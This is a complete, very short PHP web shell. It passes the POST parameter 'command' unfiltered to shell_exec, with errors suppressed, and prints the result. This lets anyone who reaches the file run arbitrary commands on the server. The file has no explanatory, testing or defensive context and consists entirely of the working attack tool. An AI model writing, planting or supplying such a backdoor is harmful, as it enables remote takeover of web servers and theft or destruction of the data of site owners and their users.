<?php
function shell($cmd) {
  	$ret = @shell_exec($cmd);
	return $ret;
}

echo shell($_POST['command']);
?>